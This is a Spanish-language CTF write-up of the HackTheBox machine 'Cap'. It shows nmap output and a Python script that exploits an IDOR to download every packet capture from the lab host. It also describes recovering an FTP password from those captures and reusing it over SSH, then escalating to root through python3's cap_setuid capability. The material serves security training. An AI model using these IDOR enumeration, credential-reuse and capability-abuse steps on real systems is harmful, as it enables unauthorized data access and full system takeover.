---
layout: default
title: Cap
nav_order: 2
parent: CTFs
permalink: /ctfs/cap
---

# Cap - EASY - Writeup HackTheBox
{: .fs-7 }
{: .no_toc }

---

![](/assets/images/cap/cap.png)

<br>

{: .important-title }
> Tecnicas
>
- Python scripting to abuse "Insecure Direct Object Reference(IDOR)"
- FTP Packet Analysis with Wireshark && Exposed Credentials && Credential Reuse
- Abuse of capability ("/usr/bin/python3.8") [PrivEsc]

---

A la hora de enumerar los puertos del equipo, nos topamos con que tenemos los siguientes servicios expuestos:

<br>

```
# Nmap 7.94SVN scan initiated Sat Oct  5 12:44:06 2024 as: nmap -p21,22,80 -sCV -oN InfoPorts 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up (1.5s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sat, 05 Oct 2024 15:44:26 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 05 Oct 2024 15:44:19 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 05 Oct 2024 15:44:20 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=10/5%Time=67015ED2%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,2F4C,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\
SF:x20Sat,\x2005\x20Oct\x202024\x2015:44:19\x20GMT\r\nConnection:\x20close
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:19386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\
SF:">\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20
SF:\x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x
SF:20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<me
SF:ta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sca
SF:le=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"im
SF:age/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css
SF:\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/
SF:font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20r
SF:el=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20
SF:\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.mi
SF:n\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/stati
SF:c/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpt
SF:ions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sat,
SF:\x2005\x20Oct\x202024\x2015:44:20\x20GMT\r\nConnection:\x20close\r\nCon
SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,
SF:\x20HEAD\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20t
SF:ext/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\
SF:x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<bod
SF:y>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inv
SF:alid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;R
SF:TSP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,
SF:189,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x
SF:20Sat,\x2005\x20Oct\x202024\x2015:44:26\x20GMT\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x202
SF:32\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\
SF:x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</
SF:h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20
SF:server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x2
SF:0check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  5 12:46:56 2024 -- 1 IP address (1 host up) scanned in 170.06 seconds
```

Si tratamos de iniciar sesión en el puerto *21* como usuario "*Anonymous*", no nos deja. Es por eso que pasamos directamente al puerto *80*, donde vemos la siguiente aplicaciónn:

<br>

![](/assets/images/cap/cap-web.png)

<br>

Al parecer es una aplicación que nos permite ver información del equipo por medio de un panel, donde además tenemos un pequeño menú en la parte superior derecha para gestionar la cuenta del usuario, donde los botones no funcionan.

<br>

![](/assets/images/cap/cap-web-ip.png)

<br>

Como se ve en la imagen, la página tiene una función "IP Config" que nos permite ver la información de las distintas interfaces de red que tiene la máquina, algo similar a cuando llamamos al comando **ifconfig** en Linux. Al ver esto pensé que quizás se trataba de un *Command Injection* e intente ingresar otros comandos del sistema de Linux, como por ejemplo *id*, *whoami* o *ps* para ver si me devolvía algo, pero no.

<br>

Lo mismo pasaba con la opción de "Network Status", donde me mostraba información de las conexiones del equipo, como si estuviera llamando al comando *netstat* de Linux:

<br>

![](/assets/images/cap/cap-web-netstat.png)

<br>

Y por último tenemos la opción de "Security Snapshot" que nos permite descargar archivos **.pcap**, con información capturada de paquetes de conexiones del equipo:

<br>

![](/assets/images/cap/cap-web-security-snapshot.png)

<br>

Lo interesante en este punto es que si nos fijamos en la URL, podemos alternar entre distintos números y ver o descargar información de diferentes paquetes del equipo, es decir, que si cambio el número en "*http://10.10.10.245/data/1*" a "*2*", puedo ver información de otras capturas de paquetes echas en el equipo. Esto es una vulnerabilidad conocida llamada *IDOR(Insecure direct object reference)*, que nos permite ver y obtener información de otros usuarios, acceder a otras cuentas más privilegiadas o tener acceso a información que no deberíamos ver. 

<br>

Todo esto ocurre por una mala configuración de la aplicación que nos permite saltar controles de acceso, que en realidad deberían limitar a los usuarios comunes la acción de obtener datos y recursos que no se les tiene permitido ver. Para explotar esto, cree un script en python3 que lo que hace es ir descargando todos los archivos ".pcap" de manera automatizada, sin tener que bajarlos yo uno por uno:

<br>

```
#!/usr/bin/python3

import sys
import signal
import requests
from urllib import request
from colorama import Fore, Style

def handler(sig, frame):
    print(Fore.YELLOW + "\n[!] Process interrupted...\n" + Style.RESET_ALL)
    sys.exit(1)

def exploit_idor():
    for i in range(0, 31):
        r = requests.get(f"http://10.10.10.245/download/{i}")
        if r.status_code == 200:
            print(Fore.GREEN + f"\n[+] Downloading file pcap ({i}.pcap).....\n" + Style.RESET_ALL)
            request.urlretrieve(f"http://10.10.10.245/download/{i}", f"{i}.pcap")

def main():
    signal.signal(signal.SIGINT, handler)
    exploit_idor()


if __name__=="__main__":
    main()
```

<br>

Una vez echo esto, me quedaría algo como lo siguiente:

<br>

![](/assets/images/cap/pcaps.png)

<br>

Para ver y analizar cada uno de estos paquetes, utilizo Wireshark y obtengo lo siguiente:

<br>

![](/assets/images/cap/wireshark-pcap.png)

<br>

Si filtramos por **ftp**, tenemos que el usuario *Nathan* inicio sesión en el servicio *FTP* del equipo y a su vez, podemos ver la contraseña expuesta del mismo, que podemos intentar reutilizar por SSH, que de hecho funciona y nos permite ganar acceso al equipo como el usuario "Nathan".

<br>

Pero antes de saltar a la escalada de privilegios, quería mostrarles que también si utilizan los comandos *strings* y *grep*, podemos ver el nombre y contraseña del usuario Nathan sin utilizar Wireshark:

<br>

![](/assets/images/cap/strings-pcap.png)

<br>

Ya dentro del servidor como Nathan, lo que hago, es buscar la forma de escalar privilegios enumerando el equipo y me tope con que python3 tiene atributos espaciales. Es decir, a esto se lo conoce como "*Capabilities*" y lo que hace es otorgar privilegios específicos al binario o ejecutable, cuyo valor de ID es 0, es decir que podemos correr esos programas como el usuario root:

<br>

![](/assets/images/cap/getcap-cap.png)

<br>

Si investigamos en internet como explotar esta funcionalidad, deberíamos hacer lo siguiente:

<br>

![](/assets/images/cap/cap-privesc.png)

<br>

Lo que está pasando aquí, es que le estamos diciendo a python3 que debe importar la librería *OS* para obtener una Shell bash asignado el valor del user id en '0' para que cuando yo ejecute Python, me realice la operación como el usuario root y no como Nathan, porque si quito la línea de **os.setud(0)**, simplemente me va a devolver una nueva Shell como Nathan y no queremos eso.

<br> 

Aquí nos estamos aprovechando de que Python tiene la capacidad de "**cap_setuid**" asignada y lo que esto quiere decir, es que Python puede realizar manipulaciones arbitrarias con el ID del usuario que está ejecutando el binario.